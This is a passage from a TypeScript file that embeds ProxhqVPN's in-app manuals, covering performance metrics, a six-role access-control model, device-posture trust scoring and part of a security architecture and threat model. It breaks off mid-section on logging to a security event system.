The Performance Monitor provides live, real operating system metrics
from the ProxhqVPN API server — not mocked data. All metrics are
sourced directly from the OS and WireGuard runtime.

Navigate to: Admin → Performance (/monitor)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. METRICS SOURCES

CPU Usage:
  Source: Node.js os.cpus() — per-core user/system/idle breakdown
  Refresh: 5 seconds

Memory Usage:
  Source: os.totalmem() and os.freemem()
  Shows: total, used, free, usage percentage

Network I/O:
  Source: /proc/net/dev (Linux) — per-interface RX/TX bytes
  Interfaces: eth0, wg0, and all active WireGuard tunnels

Active Connections:
  Source: ss -ntu | wc -l — real socket count from the kernel

WireGuard Peers:
  Source: wg show all dump — live peer list with:
  public key (truncated), allowed IPs, endpoint, latest handshake timestamp,
  RX/TX bytes per peer

External IP:
  Source: api.ipify.org — confirms the server's current public IP

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. CHARTS

24-hour bandwidth chart:
  RX and TX in MB/s for eth0 (internet-facing interface)
  Stored in memory — resets on API server restart

WireGuard peer activity chart:
  Connected peer count over time

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. ALERTS

High CPU (>85% for 60s): notification in dashboard
High Memory (>90%): notification + recommendation to restart API server
No active WireGuard peers: alert (may indicate WireGuard daemon crash)

API: GET /api/monitor/cpu · /api/monitor/memory · /api/monitor/network
     /api/monitor/connections · /api/monitor/wireguard · /api/monitor/external-ip

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },

  // ── RBAC & Access Control ────────────────────────────────────────────────────
  {
    id: "rbac-access-manual",
    title: "RBAC & Access Control",
    subtitle: "6-Role model, permission table, route enforcement, and role assignment",
    version: "1.0",
    pages: 10,
    icon: Shield,
    iconColor: "text-cyan-400",
    tier: "both",
    content: `ProxhqVPN: RBAC & Access Control Manual v1.0
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
legal@alphauntechnologies.com | proxhqvpn.com

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview — Why RBAC?
2. The Six Roles
3. Permission Matrix
4. Enforcement Points
5. Assigning Roles
6. API Reference
7. Future Roadmap
8. Audit & Compliance Notes
9. Glossary

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW — WHY RBAC?

ProxhqVPN operates across a diverse operator base: solo self-hosters,
enterprise teams with separate network and security functions, and managed
security service providers (MSSPs) running multi-tenant deployments.
A flat "admin / not-admin" model is inadequate — a network engineer should
not have access to billing records, and a read-only auditor should not be
able to arm the kill switch.

Role-Based Access Control (RBAC) solves this by assigning permissions to
roles, and roles to users, rather than permissions directly to individuals.
When an operator adds a new team member, they assign a role — not a
checklist of individual permissions.

Core principles:
  ▸ Least privilege — every role has the minimum permissions required.
  ▸ Separation of duties — security admins cannot change billing; billing
    contacts cannot modify firewall rules.
  ▸ Audit trail — every permission check is observable; denied actions are
    logged with the action, role, and resource.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. THE SIX ROLES

┌─────────────────┬──────────────────────────────────────────────────────┐
│ Role            │ Description                                          │
├─────────────────┼──────────────────────────────────────────────────────┤
│ owner           │ Unrestricted access. Creates/removes other roles.    │
│                 │ Can destructively modify any resource.               │
├─────────────────┼──────────────────────────────────────────────────────┤
│ security_admin  │ Full security toolkit access: SIEM, audit chain,     │
│                 │ ZTNA policy, firewall rules, threat intel.           │
│                 │ Can revoke WireGuard configs and ban devices.        │
├─────────────────┼──────────────────────────────────────────────────────┤
│ network_admin   │ Node and WireGuard management: add/remove nodes,     │
│                 │ rotate keys, modify split tunneling and DNS.         │
│                 │ Cannot access audit chain or SIEM output.           │
├─────────────────┼──────────────────────────────────────────────────────┤
│ auditor         │ Read-only across all security and network data.      │
│                 │ Can export audit chain and view SIEM events.         │
│                 │ Cannot modify any configuration.                     │
├─────────────────┼──────────────────────────────────────────────────────┤
│ support         │ View-only access to node status, user config list,   │
│                 │ and system health. Cannot see keys or audit chain.  │
├─────────────────┼──────────────────────────────────────────────────────┤
│ user            │ Standard authenticated user. Can manage their own    │
│                 │ WireGuard configs and devices only.                  │
└─────────────────┴──────────────────────────────────────────────────────┘

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. PERMISSION MATRIX

10 defined actions across 4 resource domains:

┌─────────────────────────┬───────┬────────────┬─────────────┬─────────┬─────────┬──────┐
│ Action                  │ owner │ sec_admin  │ net_admin   │ auditor │ support │ user │
├─────────────────────────┼───────┼────────────┼─────────────┼─────────┼─────────┼──────┤
│ admin:read              │  ✅   │     ✅     │      ✅     │   ✅    │   ✅    │  ❌  │
│ admin:write             │  ✅   │     ✅     │      ❌     │   ❌    │   ❌    │  ❌  │
│ vpn:read                │  ✅   │     ✅     │      ✅     │   ✅    │   ✅    │  ✅  │
│ vpn:write               │  ✅   │     ✅     │      ✅     │   ❌    │   ❌    │  ❌  │
│ vpn:own_config          │  ✅   │     ✅     │      ✅     │   ❌    │   ❌    │  ✅  │
│ audit:read              │  ✅   │     ✅     │      ❌     │   ✅    │   ❌    │  ❌  │
│ audit:export            │  ✅   │     ✅     │      ❌     │   ✅    │   ❌    │  ❌  │
│ security:read           │  ✅   │     ✅     │      ❌     │   ✅    │   ❌    │  ❌  │
│ security:write          │  ✅   │     ✅     │      ❌     │   ❌    │   ❌    │  ❌  │
│ users:manage            │  ✅   │     ❌     │      ❌     │   ❌    │   ❌    │  ❌  │
└─────────────────────────┴───────┴────────────┴─────────────┴─────────┴─────────┴──────┘

vpn:own_config = can manage their own configs/devices only (not others').

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. ENFORCEMENT POINTS

RBAC is enforced via the requirePermission() middleware in lib/rbac.ts.

Usage pattern:
  router.post("/rule", requirePermission("security:write"), handler);

Current enforcement:
  ▸ POST /api/ztna/posture — requires security:write (or any security_admin+)
  ▸ GET  /api/ztna/device/:fp — requires security:read

Planned enforcement:
  ▸ POST /api/firewall/rules — security:write
  ▸ GET  /api/security-audit/audit-chain — audit:export
  ▸ POST /api/nodes/:id — vpn:write
  ▸ POST /api/terminal/exec — admin:write (owner/security_admin only)
  ▸ PUT  /api/users/:id/role — users:manage (owner only)

In absence of a DB role record, users default to the 'user' role.
The ADMIN_EMAILS env var guarantees owner role on every login for listed emails.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

5. ASSIGNING ROLES

Roles are stored in the users table, role column (default: 'user').

Method 1 — Direct DB update (owner only, via SQL interface):
  UPDATE users SET role = 'security_admin' WHERE email = 'alice@example.com';

Method 2 — Admin API (owner only):
  PUT /api/users/:id  { "role": "auditor" }

Method 3 — Admin panel (upcoming):
  /admin/users → Role column → dropdown selector

Method 4 — Environment variable override (owner guarantee):
  ADMIN_EMAILS=admin@example.com,backup@example.com
  These users are forced to 'owner' on every login regardless of DB state.

Role changes take effect on the next API request — no session restart required
(roles are re-fetched from DB per request in requirePermission()).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

6. API REFERENCE

lib/rbac.ts exports:

  can(role: Role, action: Action): boolean
    → Returns true if the given role can perform the action.

  requirePermission(action: Action): RequestHandler
    → Express middleware. Reads userId from Clerk auth, fetches role from DB,
      calls can(). Returns 403 if denied, 401 if unauthenticated.
      Accepts owner bypass (ADMIN_EMAILS).

  ROLE_PERMISSIONS: Record<Role, Action[]>
    → Full static permission map — can be introspected for UI gating.

  ROLES: Role[]  // ["owner","security_admin","network_admin","auditor","support","user"]
  ACTIONS: Action[]  // 10 defined actions

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

7. FUTURE ROADMAP

  Phase 2 (planned):
    ▸ Resource-level permissions: user can vpn:write on their own nodes only
    ▸ Temporary role escalation: time-limited security_admin for incident response
    ▸ Role groups: assign a role to a team (org unit)
    ▸ Attribute-based conditions: e.g., only allow auditor:export during business hours

  Phase 3 (planned):
    ▸ SCIM provisioning: auto-sync roles from Okta/Azure AD
    ▸ Policy-as-code: role definitions in YAML/OPA format for GitOps workflows

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

8. AUDIT & COMPLIANCE NOTES

Every requirePermission() denial is logged via shipSecurityEvent() with:
  action: "rbac.denied"  |  result: "deny"  |  severity: "medium"
  metadata: { attemptedAction, role, userId, resource }

This means unauthorized access attempts are visible in:
  ▸ Local pino log (structured JSON)
  ▸ Splunk HEC (if SPLUNK_HEC_URL/TOKEN set)
  ▸ Generic SIEM webhook (if SIEM_WEBHOOK_URL set)
  ▸ SIEM page → /siem

For SOC 2 Type II or ISO 27001 compliance, export RBAC denial logs
monthly and include in your access control evidence package.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

9. GLOSSARY

  RBAC      — Role-Based Access Control
  Action    — A permission string ("security:write", "audit:export", etc.)
  Role      — A named set of actions assigned to a user
  Principal — The authenticated identity performing an action
  Deny-all  — The default when no role record exists in DB (maps to 'user')
  Owner     — The super-admin role; bypasses all permission checks

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

INTERNAL DOCUMENT — DO NOT DISTRIBUTE
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },

  // ── ZTNA & Device Posture ────────────────────────────────────────────────────
  {
    id: "ztna-posture-manual",
    title: "ZTNA & Device Posture",
    subtitle: "Zero Trust Network Access — posture scoring, trust model, and client integration",
    version: "1.0",
    pages: 12,
    icon: Shield,
    iconColor: "text-purple-400",
    tier: "pro",
    content: `ProxhqVPN: ZTNA & Device Posture Manual v1.0
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
legal@alphauntechnologies.com | proxhqvpn.com

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. What is Zero Trust Network Access?
2. ProxhqVPN ZTNA Architecture
3. The 8 Device Posture Signals
4. Trust Score Calculation
5. Allow / Deny Thresholds
6. Submitting a Posture Check
7. Client Integration Guide
8. Admin — Viewing Device Records
9. API Reference
10. Troubleshooting
11. Compliance Notes

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. WHAT IS ZERO TRUST NETWORK ACCESS?

Traditional VPN security assumes: "If you can connect, you're trusted."
This perimeter model is catastrophically insufficient for modern threats:
  ▸ A stolen credential bypasses the VPN entirely.
  ▸ A compromised device that passes authentication can exfiltrate data.
  ▸ Malware on an "authorized" device is indistinguishable from the user.

Zero Trust flips this: "Never trust, always verify — including connected devices."
Every connection attempt is evaluated not just by who you are, but by the
security posture of the device you're connecting from.

ZTNA answers: "Is this device trustworthy enough to receive a tunnel config?"

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. PROXHQVPN ZTNA ARCHITECTURE

  ┌──────────────┐   POST /api/ztna/posture    ┌──────────────────────┐
  │  VPN Client  │ ─────────────────────────▶  │  Device Trust Engine │
  │  (signals)   │                             │  lib/device-trust.ts │
  └──────────────┘                             └──────────┬───────────┘
                                                          │ score + allow
                                                          ▼
                                               ┌──────────────────────┐
  ┌──────────────┐                             │   ztna_devices table │
  │ WireGuard    │  if allow=true only         │   (audit + history)  │
  │ Config Gen   │ ◀────────────────────────── └──────────────────────┘
  └──────────────┘

Flow:
  1. Client collects 8 device signals.
  2. Client POSTs signals to /api/ztna/posture.
  3. Engine scores the device (0–100).
  4. If score ≥ 75: allow=true — client proceeds to generate WireGuard config.
  5. If score < 75: allow=false — client shows remediation guidance, blocks config.
  6. Every decision is persisted to ztna_devices and emitted to SIEM.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. THE 8 DEVICE POSTURE SIGNALS

Signal data is collected by the ProxhqVPN client app and sent to the API.
The API does not poll the device directly — all signals are client-reported
and treated as attestations. Future versions will add server-side validation
for certificate and IP reputation signals.

┌────────────────────────┬────────────┬────────────────────────────────────────┐
│ Signal                 │ Max Points │ Description                            │
├────────────────────────┼────────────┼────────────────────────────────────────┤
│ diskEncryption         │    20      │ Full-disk encryption enabled           │
│                        │            │ (BitLocker / FileVault / dm-crypt)    │
├────────────────────────┼────────────┼────────────────────────────────────────┤
│ firewallEnabled        │    15      │ Host firewall active                   │
│                        │            │ (Windows Firewall / pf / ufw)         │
├────────────────────────┼────────────┼────────────────────────────────────────┤
│ edrInstalled           │    15      │ Endpoint Detection & Response present  │
│                        │            │ (CrowdStrike / Defender ATP / Wazuh)  │
├────────────────────────┼────────────┼────────────────────────────────────────┤
│ noRootOrJailbreak      │    20      │ Device not rooted / jailbroken         │
│                        │            │ Rooted devices lose full 20 pts        │
├────────────────────────┼────────────┼────────────────────────────────────────┤
│ patchAge               │    15      │ Last OS patch ≤ 30 days old            │
│                        │            │ (15=current, 8=31-90d, 0=>90d)        │
├────────────────────────┼────────────┼────────────────────────────────────────┤
│ certificateValid       │    10      │ Device certificate signed by trusted   │
│                        │            │ ProxhqVPN CA and not expired          │
├────────────────────────┼────────────┼────────────────────────────────────────┤
│ ipReputationClean      │     5      │ Source IP not on Spamhaus/AbuseIPDB   │
│                        │            │ threat intelligence blocklists         │
├────────────────────────┼────────────┼────────────────────────────────────────┤
│ osVersion              │   +0/-5    │ Unsupported OS versions: -5 pts        │
│                        │            │ (e.g., Windows 7, macOS 11, Android 9)│
└────────────────────────┴────────────┴────────────────────────────────────────┘

Maximum score: 100  |  Minimum score: 0  |  Passing threshold: 75

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. TRUST SCORE CALCULATION

Score = Σ(signal points) — penalty(unsupportedOs)

Example A — Corporate laptop, fully compliant:
  diskEncryption:      ✅ +20
  firewallEnabled:     ✅ +15
  edrInstalled:        ✅ +15
  noRootOrJailbreak:   ✅ +20
  patchAge:            ✅ +15 (patched 3 days ago)
  certificateValid:    ✅ +10
  ipReputationClean:   ✅ +5
  osVersion:           ✅ +0
  ─────────────────────────────
  TOTAL: 100/100  →  allow=true

Example B — Personal phone, no EDR, old patch:
  diskEncryption:      ✅ +20
  firewallEnabled:     ✅ +15
  edrInstalled:        ❌ +0
  noRootOrJailbreak:   ✅ +20
  patchAge:            ⚠️ +8  (patched 45 days ago)
  certificateValid:    ✅ +10
  ipReputationClean:   ✅ +5
  osVersion:           ✅ +0
  ─────────────────────────────
  TOTAL: 78/100  →  allow=true (passes threshold)

Example C — Rooted Android, no disk encryption:
  diskEncryption:      ❌ +0
  firewallEnabled:     ✅ +15
  edrInstalled:        ❌ +0
  noRootOrJailbreak:   ❌ +0  (ROOTED — full penalty)
  patchAge:            ⚠️ +0  (>90 days)
  certificateValid:    ✅ +10
  ipReputationClean:   ✅ +5
  osVersion:           ❌ -5  (Android 8)
  ─────────────────────────────
  TOTAL: 25/100  →  allow=false

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

5. ALLOW / DENY THRESHOLDS

  ▸ score ≥ 75  →  allow=true   — tunnel config generation permitted
  ▸ score 50–74 →  allow=false  — show remediation; flag for review
  ▸ score < 50  →  allow=false  — high-risk device; log to SIEM as "high" severity
  ▸ score = 0   →  allow=false  — critical signal failure; log as "critical"

Threshold can be overridden per-deployment by setting:
  ZTNA_MIN_SCORE=80  (in your .env or system environment)

Default is 75 if the env var is not set.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

6. SUBMITTING A POSTURE CHECK

Endpoint:  POST /api/ztna/posture
Auth:      Clerk session (all authenticated users)
Body:

  {
    "fingerprint": "sha256-device-identifier-unique-per-device",
    "signals": {
      "diskEncryption":    true,
      "firewallEnabled":   true,
      "edrInstalled":      false,
      "noRootOrJailbreak": true,
      "patchAge":          45,
      "certificateValid":  true,
      "ipReputationClean": true,
      "osVersion":         "Windows 11"
    }
  }

Response:

  {
    "fingerprint": "sha256-...",
    "score": 78,
    "allow": true,
    "signals": { ... },
    "checkedAt": "2026-06-09T12:00:00.000Z",
    "details": {
      "edrInstalled": "EDR not installed — risk +0 pts contribution"
    }
  }

The fingerprint is a per-device stable identifier (e.g., SHA-256 of
hardware ID + OS install ID). It is used to look up device history via
GET /api/ztna/device/:fingerprint.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

7. CLIENT INTEGRATION GUIDE

Before calling POST /api/wireguard/my-config, the client MUST:

  1. Collect device signals (OS APIs or agent):
       diskEncryption  → BitLocker API / FileVault API / cryptsetup
       firewall        → netsh advfirewall / pfctl / ufw
       edr             → registry probe / process list check
       rootCheck       → SafetyNet (Android) / DeviceCheck (iOS) / su binary check
       patchAge        → last Windows Update / softwareupdate / apt-get -s upgrade

  2. POST signals to /api/ztna/posture
     Store the response. If allow=false, show remediation and STOP.

  3. If allow=true, proceed to POST /api/wireguard/my-config.

Recommended UX flow:
  [Step 1: Select Node] → [Step 2: Posture Check] → [Step 3: Generate Config]
  Show posture score + breakdown in Step 2 so users understand why
  their device passed or failed.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

8. ADMIN — VIEWING DEVICE RECORDS

Endpoint:  GET /api/ztna/device/:fingerprint
Auth:      Clerk session + security:read permission (security_admin / auditor / owner)

Returns full posture history for the device fingerprint:
  {
    "device": { id, fingerprint, userId, score, allow, signals, checkedAt },
    "history": [ { score, allow, checkedAt }, ... ]
  }

The ztna_devices table also feeds the SIEM page (/siem) — all posture denials
appear in the GhostTrace event stream for incident correlation.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

9. API REFERENCE

  POST /api/ztna/posture
    Body:  ZtnaPostureRequest (fingerprint + signals object)
    Auth:  requireAuth (any authenticated user)
    Emits: appendAuditEvent("ztna.posture_checked") + shipSecurityEvent()

  GET /api/ztna/device/:fp
    Auth:  requirePermission("security:read")
    Returns: full device record + signal history

  lib/device-trust.ts
    scoreDevice(signals): number   → raw score 0–100
    evaluatePosture(signals): { score, allow, details }

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

10. TROUBLESHOOTING

  "allow=false, score=74 — just below threshold"
  → Check which signals are failing via the details field.
  → Most commonly: patchAge (update your OS) or edrInstalled.

  "certificateValid=false even though I have a cert"
  → Certificate must be signed by the ProxhqVPN CA.
  → Generate via: bash standalone/scripts/generate-ca-and-mtls.sh
  → Install the resulting client.crt and client.key on the device.

  "My fingerprint changed between checks"
  → Fingerprint should be stable. Ensure it's based on hardware ID,
    not something ephemeral like MAC address (may change with VPN).
  → Recommended: SHA-256(cpu_id + motherboard_serial + os_install_id)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

11. COMPLIANCE NOTES

ZTNA device posture enforcement supports:

  NIST SP 800-207 (Zero Trust Architecture):
    → Satisfies "Device Health" continuous verification requirement (§3.3.1)

  CIS Controls v8:
    → Control 1 (Enterprise Asset Management) via device fingerprinting
    → Control 4 (Secure Configuration) via firewall + disk encryption checks
    → Control 7 (Continuous Vulnerability Management) via patchAge signal

  SOC 2 Type II / ISO 27001:
    → Access control evidence: all posture decisions logged with timestamp,
      score, signals, and allow/deny verdict in ztna_devices table.
    → Export via: SELECT * FROM ztna_devices ORDER BY checked_at DESC;

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

INTERNAL DOCUMENT — DO NOT DISTRIBUTE
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },

  // ── Security Architecture v3.0 ───────────────────────────────────────────────
  {
    id: "security-arch-v3",
    title: "Security Architecture — v3.0",
    subtitle: "Full-stack security model: defence layers, audit chain, RBAC, ZTNA, and threat model",
    version: "3.0",
    pages: 30,
    icon: Shield,
    iconColor: "text-red-400",
    tier: "both",
    content: `ProxhqVPN: Security Architecture Manual v3.0
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
legal@alphauntechnologies.com | proxhqvpn.com

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

 1. Introduction & Scope
 2. Threat Model — Attacker Profiles
 3. Defence-in-Depth Architecture
 4. Authentication Layer (Clerk)
 5. Authorization Layer (RBAC)
 6. Zero Trust — Device Posture (ZTNA)
 7. WireGuard Key Architecture (RAM-Only)
 8. Encrypted Secret Store (AES-256-GCM)
 9. Tamper-Evident Audit Chain (SHA3-256)
10. SIEM Fanout & Real-Time Alerting
11. Firewall Suite & ATR
12. Daemon Security (mTLS + PSK)
13. Transport Security (Helmet / HSTS / CSP)
14. Rate Limiting Strategy
15. Shell & SQL Security
16. Honeypot & Deception Network (SilkWeb)
17. Tor / Obfuscation Layer
18. Post-Quantum Resistance (PSK)
19. Incident Response Procedures
20. Security Gaps & Remediation Roadmap
21. Compliance Mappings
22. Key Contacts & Escalation

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. INTRODUCTION & SCOPE

This document is the authoritative security architecture reference for
ProxhqVPN (Alpha Unlimited Technologies LLC). It covers all layers of the
platform security model as of version 3.0 (June 2026).

Audience:
  ▸ Security administrators configuring the platform
  ▸ Auditors conducting security reviews
  ▸ Enterprise customers evaluating the platform for compliance
  ▸ ProxhqVPN engineers extending or modifying security-relevant code

Scope:
  ▸ Cloud-hosted deployment (Replit / production)
  ▸ Self-hosted standalone deployment
  ▸ Mobile client (iOS / Android Expo)
  ▸ Node infrastructure (60-node WireGuard mesh)

Out of scope:
  ▸ Physical datacenter security of hosting provider
  ▸ Third-party Clerk authentication infrastructure
  ▸ End-user device security (addressed separately in ZTNA Manual)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. THREAT MODEL — ATTACKER PROFILES

Four threat actors are in scope:

  T1 — External Network Attacker
    Motivation: Port scan, exploit public services, credential stuffing.
    Vector: Public API endpoints, brute-force login.
    Controls: Rate limiting, Clerk auth, Helmet CSP/HSTS, ATR perimeter.

  T2 — Compromised User Account
    Motivation: Unauthorized lateral movement, data exfiltration.
    Vector: Stolen Clerk session token or phished credentials.
    Controls: ZTNA device posture (stops token replay on untrusted device),
              RBAC (limits blast radius), audit chain (detects anomaly).

  T3 — Malicious Insider (Admin)
    Motivation: Key theft, data exfiltration, service disruption.
    Vector: Admin API access, SQL interface, terminal shell.
    Controls: Audit chain with HMAC-SHA512 (tamper-evident log),
              SIEM fanout (admin actions visible to external SIEM),
              Break-glass token audit (logged), SHA3-256 chain verify.

  T4 — Physical Server Seizure
    Motivation: WireGuard private key recovery, traffic correlation.
    Vector: Physical access to node hardware.
    Controls: RAM-only WireGuard keys (no keys on disk), AES-256-GCM
              encrypted config store, no plaintext key persistence.

Out of scope: Nation-state adversaries with quantum computing capability
(partially addressed via PSK post-quantum layer — see §18).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. DEFENCE-IN-DEPTH ARCHITECTURE

Seven layers, outermost to innermost:

  ┌──────────────────────────────────────────────────────────────────┐
  │ Layer 7: Deception (SilkWeb honeypot + silk-web beacon network)  │
  ├──────────────────────────────────────────────────────────────────┤
  │ Layer 6: Obfuscation (obfs4/Shadowsocks/V2Ray/Meek — anti-DPI)  │
  ├──────────────────────────────────────────────────────────────────┤
  │ Layer 5: Tunnel (WireGuard PSK + RAM-only keys)                  │
  ├──────────────────────────────────────────────────────────────────┤
  │ Layer 4: Application Auth (Clerk JWT + RBAC + ZTNA posture)      │
  ├──────────────────────────────────────────────────────────────────┤
  │ Layer 3: Transport (HTTPS + HSTS + Helmet + CSP)                 │
  ├──────────────────────────────────────────────────────────────────┤
  │ Layer 2: Network (ATR + firewall + DDoS + rate limits)           │
  ├──────────────────────────────────────────────────────────────────┤
  │ Layer 1: Monitoring (Audit chain + SIEM + GhostTrace + IDS)      │
  └──────────────────────────────────────────────────────────────────┘

No single layer is sufficient. An attacker who bypasses one layer
encounters the next. The audit chain (Layer 1) is the last line of
accountability — even if all other layers are bypassed, the tamper-evident
log records what happened.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. AUTHENTICATION LAYER (CLERK)

Provider: Clerk (app_3CcwHo66ohArVtaIa0XTcv88i4Y)
Protocol: JWT-based session tokens, OpenID Connect
MFA: Supported via Clerk dashboard (TOTP, SMS)

Enforcement:
  ▸ requireAuth middleware wraps all /api/* routes except /api/healthz
    and /api/daemon-inbound/* (daemon routes use PSK — see §12).
  ▸ getAuth(req) extracts userId from Clerk JWT. Returns null if invalid.
  ▸ All admin routes additionally check userId against ADMIN_EMAILS or
    verify the users.role value in the database.

Session hardening:
  ▸ SESSION_SECRET env var controls Express session signing (64-char hex).
  ▸ Sessions are ephemeral — no persistent session store (stateless JWT).
  ▸ Clerk proxy path: /api/__clerk (production — avoids direct Clerk CDN).

Gaps:
  ▸ MFA is not enforced — optional for users. Recommendation: enforce MFA
    for owner and security_admin roles via Clerk organization rules.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

5. AUTHORIZATION LAYER (RBAC)

See RBAC & Access Control Manual (rbac-access-manual) for full details.

Key properties:
  ▸ 6 roles: owner / security_admin / network_admin / auditor / support / user
  ▸ 10 defined actions across 4 domains (admin, vpn, audit, security, users)
  ▸ requirePermission() middleware enforces at route level
  ▸ Default role: 'user' — least privilege on missing DB record
  ▸ ADMIN_EMAILS bypass: owner-guaranteed for listed emails on every login

Current gap:
  Most admin routes still use coarse requireAdmin instead of fine-grained
  requirePermission(). This is the primary outstanding authorization work item.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

6. ZERO TRUST — DEVICE POSTURE (ZTNA)

See ZTNA & Device Posture Manual (ztna-posture-manual) for full details.

Key properties:
  ▸ 8 device signals → 0–100 trust score
  ▸ Threshold ≥ 75 = allow tunnel config generation
  ▸ All decisions persisted to ztna_devices table + SIEM
  ▸ appendAuditEvent("ztna.posture_checked") on every check

Current gap:
  Client does not yet enforce posture check before config generation.
  This is the highest-severity open finding (see §20).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

7. WIREGUARD KEY ARCHITECTURE (RAM-ONLY)

Server-side (nodes):
  ▸ Mullvad-style RAM-only architecture.
  ▸ Private key never written to disk. Lives only in /dev/shm/ (volatile RAM).
  ▸ On boot, node calls POST /api/daemon-inbound/wg-key (PSK-authenticated).
  ▸ Power cycle = key destruction. Disk image = no key.
  ▸ 4 active nodes: Los Angeles, London, Chicago, Tokyo.

Client-side (user configs):
  ▸ Generated keypair — private key immediately encrypted via AES-256-GCM.
  ▸ Stored as clientPrivateKeyEnc (encrypted ciphertext) in userWgConfigs.
  ▸ Plaintext private key never persists in the database.
  ▸ Decrypted on demand only in GET /api/wireguard/my-config/:id/text.

PSK (PresharedKey):
  ▸ 256-bit random PSK generated per peer, stored AES-256-GCM encrypted.
  ▸ Mixed into WireGuard Noise handshake per §5.4 of WireGuard paper.
  ▸ Provides post-quantum resistance (harvest-now/decrypt-later attack defense).
  ▸ Rotatable via POST /api/wireguard/rotate-psk/:id.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

8. ENCRYPTED SECRET STORE (AES-256-GCM)

Module: lib/encrypted-secret-store.ts

Algorithm: AES-256-GCM (authenticated encryption with additional data)
Key source: PROXHQ_MASTER_KEY_B64 env var (32-byte base64-encoded key)
AAD binding: Each ciphertext is bound to a specific record via AAD string
             (e.g., "user:{userId}:config:{configId}:clientPrivateKey")
             This prevents ciphertext transplantation between rows.

encryptSecret(plaintext, aad) → base64(iv || ciphertext || tag)
decryptSecret(ciphertext, aad) → plaintext
isEncrypted(value) → true if starts with "enc:v1:"

Security properties:
  ▸ Unique 12-byte random IV per encryption operation.
  ▸ GCM authentication tag prevents bitflip attacks.
  ▸ AAD binding prevents key/config swapping attacks.
  ▸ No key derivation from password — direct 256-bit key from env.

Rotation procedure:
  1. Generate new PROXHQ_MASTER_KEY_B64 value.
  2. Run POST /api/wireguard/backfill-encryption (re-encrypts all rows).
  3. Replace env var. Zero-downtime if done atomically.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

9. TAMPER-EVIDENT AUDIT CHAIN (SHA3-256)

Module: lib/audit-chain.ts

Chain construction:
  Each entry contains:
    { id, timestamp, actor, action, resource, result, ip, metadata,
      hash,     ← SHA3-256(prev_hash + canonical_entry_json)
      hmac }    ← HMAC-SHA512(entry_json, AUDIT_HMAC_KEY_B64)

Properties:
  ▸ Hash chain: entry N's hash incorporates entry N-1's hash.
    Any modification to a past entry invalidates all subsequent hashes.
  ▸ HMAC signature: each entry is independently signed with the HMAC key.
    Even if hashes are recomputed, HMAC cannot be forged without the key.
  ▸ verifyChain() checks both hash continuity and all HMACs.

Instrumented events (as of v3.0):
  ▸ ztna.posture_checked — every ZTNA posture evaluation
  ▸ wireguard.config_created — every WireGuard config generation
  ▸ wireguard.key_downloaded — every WireGuard config text download
  ▸ daemon.wg_key_served — every daemon key delivery

Planned instrumentation:
  ▸ rbac.denied — every permission denial
  ▸ firewall.rule_changed — every firewall rule modification
  ▸ admin.user_role_changed — every role assignment

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

10. SIEM FANOUT & REAL-TIME ALERTING

Module: lib/siem.ts

Every shipSecurityEvent() call fans out to three destinations simultaneously:

  1. Local structured log (pino)
     Always fires first. Guaranteed delivery.
